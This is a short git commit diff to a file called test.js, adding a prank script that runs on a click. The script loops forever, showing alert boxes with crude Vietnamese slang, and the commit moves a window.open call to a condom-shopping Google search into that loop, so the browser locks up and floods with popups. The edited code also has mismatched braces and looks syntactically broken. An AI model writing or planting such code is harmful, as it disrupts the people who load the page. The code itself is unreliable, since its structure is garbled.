95d44ed1085bb5961cf161074bad7e7fce6bf95e
John Tank <ncq998@gmail.com>
2018-04-24 08:33:07 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,7 @@
 window.addEventListener("click",()=>{
   while(1){
-    alert("oc vcl  ahahahahahahahahhahahahahahhahhahahahah"); 
-  }
+    alert("oc vcl  ahahahahahahahahhahahahahahhahhahahahah");
+    window.open("https://www.google.com/search?q=mua+bao+cao+su&ie=utf-8&oe=utf-8&client=firefox-b-ab")});
+  };
   
-  window.open("https://www.google.com/search?q=mua+bao+cao+su&ie=utf-8&oe=utf-8&client=firefox-b-ab")});
+  
